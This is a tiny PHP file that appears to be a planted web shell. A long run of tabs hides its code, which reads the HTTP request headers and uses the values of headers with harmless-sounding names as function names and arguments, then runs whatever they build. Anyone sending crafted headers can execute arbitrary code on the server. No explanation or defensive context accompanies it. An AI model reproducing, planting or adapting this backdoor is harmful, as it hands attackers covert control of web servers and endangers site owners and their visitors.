<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Large-Allocation'])){$request=$_HEADERS['Large-Allocation']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Sec-Websocket-Accept']));$request();}
